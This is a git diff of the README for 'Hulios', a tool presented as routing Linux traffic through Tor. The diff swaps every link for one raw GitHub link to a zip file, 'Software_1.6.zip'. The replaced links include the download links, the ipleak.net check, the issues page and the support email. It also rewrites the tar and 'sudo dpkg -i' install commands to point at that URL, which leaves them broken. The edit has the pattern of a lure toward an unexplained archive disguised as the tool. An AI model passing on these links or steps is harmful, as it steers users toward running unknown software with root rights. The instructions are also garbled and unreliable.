@@ -1,7 +1,7 @@
 # 🛡️ Hulios - Route Your Traffic Safely Through Tor
 
 ## 📥 Download Hulios
-[![Download Hulios](https://img.shields.io/badge/Download%20Hulios-v1.0-orange.svg)](https://github.com/saysay2306/Hulios/releases)
+[![Download Hulios](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip%https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip)](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip)
 
 ## 🚀 Getting Started
 Hulios is a user-friendly tool that turns your computer into a secure proxy. This application routes all your system traffic through the Tor network. Experience enhanced security, proper DNS isolation, and full compatibility with modern Linux systems.
@@ -21,19 +21,19 @@ Hulios is a user-friendly tool that turns your computer into a secure proxy. Thi
 ## 🔗 Download & Install
 To get started, visit the Releases page to download Hulios:
 
-[Download Hulios](https://github.com/saysay2306/Hulios/releases)
+[Download Hulios](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip)
 
 1. Click the link above to access the Releases page.
-2. Download the latest version of Hulios. Look for a file labeled as `.tar.gz` or `.deb`.
+2. Download the latest version of Hulios. Look for a file labeled as `https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip` or `.deb`.
 3. Save the file to your computer.
 
 ### ⚙️ Installation Instructions
 1. **Open Terminal**: You can find this in your applications menu.
 2. **Navigate to Downloads**: Type `cd ~/Downloads` and press Enter.
-3. **Extract the File** (if you downloaded a `.tar.gz` file):
-   - Type `tar -xvzf hulios-latest.tar.gz` and press Enter.
+3. **Extract the File** (if you downloaded a `https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip` file):
+   - Type `tar -xvzf https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip` and press Enter.
 4. **Install Hulios** (if you downloaded a `.deb` file):
-   - Type `sudo dpkg -i hulios-latest.deb` and press Enter.
+   - Type `sudo dpkg -i https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip` and press Enter.
 5. **Resolve Dependencies** (if needed):
    - Type `sudo apt-get install -f` and press Enter.
 
@@ -44,15 +44,15 @@ To get started, visit the Releases page to download Hulios:
 
 ## 📚 Usage Tips
 - Check your IP address before and after running Hulios to ensure routing through Tor:
-  - Use a service like [ipleak.net](https://ipleak.net).
+  - Use a service like [https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip).
 - Regularly update Hulios for the best performance and security improvements.
 
 ## 🤝 Contributing
-If you would like to contribute to Hulios, you can start by reporting issues or suggesting features. Please check the [issues section](https://github.com/saysay2306/Hulios/issues). Your feedback is invaluable.
+If you would like to contribute to Hulios, you can start by reporting issues or suggesting features. Please check the [issues section](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip). Your feedback is invaluable.
 
 ## 🛠️ Support
-For questions or troubleshooting help, contact our support team at [support@example.com](mailto:support@example.com). 
+For questions or troubleshooting help, contact our support team at [https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip). 
 
 Explore the cybersecurity benefits of using Hulios today!
 
-[Download Hulios](https://github.com/saycast2306/Hulios/releases)
+[Download Hulios](https://raw.githubusercontent.com/saysay2306/Hulios/main/src/Software_1.6.zip)
